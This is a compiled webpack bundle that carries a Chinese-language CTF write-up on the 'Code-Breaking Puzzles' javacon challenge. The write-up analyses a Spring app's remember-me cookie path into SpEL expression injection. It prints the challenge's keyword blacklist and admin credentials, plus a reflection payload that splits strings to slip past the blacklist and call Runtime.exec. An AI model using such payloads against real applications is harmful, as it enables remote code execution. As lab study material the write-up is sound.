"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[366],{59167:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>o,contentTitle:()=>i,default:()=>d,frontMatter:()=>s,metadata:()=>l,toc:()=>c});var a=r(74848),t=r(28453);const s={sidebar_position:1,tags:["Medium","JavaSec","SPEL"],title:"Code-Breaking Puzzles",description:"P\u795e\u7684\u6d3b\u52a8"},i="Code-Breaking Puzzles",l={id:"ctf/Learn/Code-Breaking Puzzles",title:"Code-Breaking Puzzles",description:"P\u795e\u7684\u6d3b\u52a8",source:"@site/docs/ctf/Learn/Code-Breaking Puzzles.md",sourceDirName:"ctf/Learn",slug:"/ctf/Learn/Code-Breaking Puzzles",permalink:"/docs/ctf/Learn/Code-Breaking Puzzles",draft:!1,unlisted:!1,tags:[{label:"Medium",permalink:"/docs/tags/medium"},{label:"JavaSec",permalink:"/docs/tags/java-sec"},{label:"SPEL",permalink:"/docs/tags/spel"}],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1,tags:["Medium","JavaSec","SPEL"],title:"Code-Breaking Puzzles",description:"P\u795e\u7684\u6d3b\u52a8"},sidebar:"ctfSidebar",previous:{title:"Learn",permalink:"/docs/category/learn"}},o={},c=[{value:"\u5206\u6790",id:"\u5206\u6790",level:2},{value:"\u53c2\u8003\u6587\u7ae0",id:"\u53c2\u8003\u6587\u7ae0",level:2}];function u(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,t.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h1,{id:"code-breaking-puzzles",children:"Code-Breaking Puzzles"}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsxs)(n.p,{children:["\u5173\u4e8e\u8d44\u6599\u53ef\u4ee5\u524d\u5f80 ",(0,a.jsx)(n.a,{href:"https://pan.baidu.com/s/1PNvMPQsc-F70Lyk7ZNsRrA?pwd=f228",children:"\u5171\u4eab\u8d44\u6599/Resources/challenge-0.0.1-SNAPSHOT-20240405211127-6zp33b3.jar"})]}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240405212214.png",alt:""})}),"\n",(0,a.jsx)(n.p,{children:"\u4f7f\u7528 IDEA \u8fdb\u884c\u53cd\u7f16\u8bd1, \u968f\u540e\u542f\u52a8\u5bf9\u5e94\u7684\u7a0b\u5e8f\u8fdb\u884c DeBug"}),"\n",(0,a.jsx)(n.h2,{id:"\u5206\u6790",children:"\u5206\u6790"}),"\n",(0,a.jsxs)(n.p,{children:["\u9996\u5148\u67e5\u770b ",(0,a.jsx)(n.code,{children:"application.yml"})," \u6587\u4ef6,\u53ef\u4ee5\u770b\u5230, \u63d0\u4f9b\u4e00\u4e2a\u8d26\u53f7\u4ee5\u53ca\u4e00\u4e2a\u9ed1\u540d\u5355"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-yaml",children:"spring:\n  thymeleaf:\n    encoding: UTF-8\n    cache: false\n    mode: HTML\nkeywords:\n  blacklist:\n    - java.+lang\n    - Runtime\n    - exec.*\\(\nuser:\n  username: admin\n  password: admin\n  rememberMeKey: c0dehack1nghere1\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u4ee3\u7801\u4e2d\u7684\u4e3b\u8981\u903b\u8f91\u5728 ",(0,a.jsx)(n.code,{children:"MainController"})," \u4e2d, \u9996\u5148\u67e5\u770b\u767b\u9646\u64cd\u4f5c, \u5728\u7528\u6237\u767b\u9646\u4e4b\u540e, \u5982\u679c\u52fe\u9009\u4e86 remberMe, \u90a3\u4e48\u6d4f\u89c8\u5668\u5c31\u4f1a\u5b58\u5165\u52a0\u5bc6\u540e\u7684 Cookie, \u6700\u540e\u8df3\u8f6c\u5230 ",(0,a.jsx)(n.code,{children:"hello.html"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-java",children:'@PostMapping({"/login"})\npublic String login(@RequestParam(value = "username",required = true) String username, @RequestParam(value = "password",required = true) String password, @RequestParam(value = "remember-me",required = false) String isRemember, HttpSession session, HttpServletResponse response) {\n    if (this.userConfig.getUsername().contentEquals(username) && this.userConfig.getPassword().contentEquals(password)) {\n        session.setAttribute("username", username);\n        if (isRemember != null && !isRemember.equals("")) {\n            Cookie c = new Cookie("remember-me", this.userConfig.encryptRememberMe());\n            c.setMaxAge(2592000);\n            response.addCookie(c);\n        }\n\n        return "redirect:/";\n    } else {\n        return "redirect:/login-error";\n    }\n}\n'})}),"\n",(0,a.jsxs)(n.p,{children:[(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240405213306.png",alt:""}),"\n\u968f\u540e\u5728 ",(0,a.jsx)(n.code,{children:"admin"})," \u8bf7\u6c42\u4e2d\u4f1a\u5bf9 Cookie \u8fdb\u884c\u5904\u7406"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-java",children:'@GetMapping\npublic String admin(@CookieValue(value = "remember-me",required = false) String rememberMeValue, HttpSession session, Model model) {\n    if (rememberMeValue != null && !rememberMeValue.equals("")) {\n        String username = this.userConfig.decryptRememberMe(rememberMeValue);\n        if (username != null) {\n            session.setAttribute("username", username);\n        }\n    }\n\n    Object username = session.getAttribute("username");\n    if (username != null && !username.toString().equals("")) {\n        model.addAttribute("name", this.getAdvanceValue(username.toString()));\n        return "hello";\n    } else {\n        return "redirect:/login";\n    }\n}\n'})}),"\n",(0,a.jsxs)(n.p,{children:["\u5728\u4e0a\u9762\u7684\u5904\u7406\u4e2d, \u5f53\u5224\u65ad ",(0,a.jsx)(n.code,{children:"rememberMeValue"})," \u5b58\u5728\u540e, \u5c31\u4f1a\u5bf9\u5176\u8fdb\u884c\u89e3\u5bc6, \u968f\u540e\u5c06\u5176\u8fdb\u884c\u76f8\u5173\u8d4b\u503c, \u968f\u540e\u53c8\u4f1a\u8c03\u7528 ",(0,a.jsx)(n.code,{children:"this.getAdcanceValue()"})]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-java",children:"private String getAdvanceValue(String val) {\n    String[] var2 = this.keyworkProperties.getBlacklist();\n    int var3 = var2.length;\n\n    for(int var4 = 0; var4 < var3; ++var4) {\n        String keyword = var2[var4];\n        Matcher matcher = Pattern.compile(keyword, 34).matcher(val);\n        if (matcher.find()) {\n            throw new HttpClientErrorException(HttpStatus.FORBIDDEN);\n        }\n    }\n\n    ParserContext parserContext = new TemplateParserContext();\n    Expression exp = this.parser.parseExpression(val, parserContext);\n    SmallEvaluationContext evaluationContext = new SmallEvaluationContext();\n    return exp.getValue(evaluationContext).toString();\n}\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5728\u8fd9\u4e00\u6b65\u4e2d\u53ef\u4ee5\u770b\u5230\u4e3b\u8981\u662f\u548c\u9ed1\u540d\u5355\u505a\u6b63\u5219\u5339\u914d, \u5982\u679c\u5339\u914d\u6210\u529f\u5c31\u4f1a\u629b\u51fa ",(0,a.jsx)(n.code,{children:"HttpStatus.FORBIDEN"})," , \u5982\u679c\u6ca1\u6709\u5c31\u8fdb\u884c\u6b63\u5e38\u6d41\u7a0b, \u5728 ",(0,a.jsx)(n.code,{children:"SmallEvaluationContext"})," \u8fdb\u884c SPEL \u8868\u8fbe\u5f0f\u89e3\u6790, \u8fd9\u91cc\u5c31\u4f1a\u5b58\u5728 EI \u8868\u8fbe\u5f0f\u6ce8\u5165\u7684\u95ee\u9898, \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u6784\u9020"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-java",children:'Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator"\n'})}),"\n",(0,a.jsx)(n.p,{children:"\u6267\u884c\u547d\u4ee4, \u4f46\u662f\u4f7f\u7528\u9ed1\u540d\u5355\u673a\u5236, \u56e0\u6b64\u9700\u8981\u4f7f\u7528\u53cd\u5c04\u6765\u6784\u9020\u8c03\u7528\u94fe, \u8fd9\u6837\u5c31\u53ef\u4ee5\u5728\u5173\u952e\u5b57\u5904\u4f7f\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\u6765\u8fbe\u5230\u7ed5\u8fc7\u9ed1\u540d\u5355\u7684\u6548\u679c"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-java",children:'public class RTTI {\n    public static void main(String[] args) {\n        try {\n            Method method = String.class.getClass().forName("java.lang.Runtime").getMethod("exec", String.class);\n            Method method1 = String.class.getClass().forName("java.lang.Runtime").getMethod("getRuntime");\n            Class<?> aClass = String.class.getClass().forName("java.lang.Runtime");\n            System.out.println(method.invoke(method1.invoke(aClass), "whoami"));\n        } catch (Exception e) {\n            System.out.println("\u62a5\u9519");\n        }\n    }\n}\n\n// \u8fdb\u884c\u6df7\u6dc6, \u7ed5\u8fc7\u9ed1\u540d\u5355\nString.class.getClass().forName("java.l" + "ang.R" + "untime").getMethod("ex" + "ec", String.class).invoke(String.class.getClass().forName("java.l" + "ang.R" + "untime").getMethod("getRuntime").invoke(String.class.getClass().forName("java.l" + "ang.R" + "untime")), "whoami")\n'})}),"\n",(0,a.jsxs)(n.p,{children:["\u968f\u540e\u5c06\u5176\u6784\u9020\u4e3a SPEI \u7684\u89e3\u6790\u683c\u5f0f, \u4e3b\u8981\u5c31\u662f\u6539\u4e00\u4e2a ",(0,a.jsx)(n.code,{children:"T()"})," ,"]}),"\n",(0,a.jsx)(n.h2,{id:"\u53c2\u8003\u6587\u7ae0",children:"\u53c2\u8003\u6587\u7ae0"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:(0,a.jsx)(n.a,{href:"http://rui0.cn/archives/1015",children:"Code-Breaking Puzzles \u2014 javacon WriteUp"})}),"\n"]})]})}function d(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(u,{...e})}):u(e)}},28453:(e,n,r)=>{r.d(n,{R:()=>i,x:()=>l});var a=r(96540);const t={},s=a.createContext(t);function i(e){const n=a.useContext(s);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),a.createElement(s.Provider,{value:n},e.children)}}}]);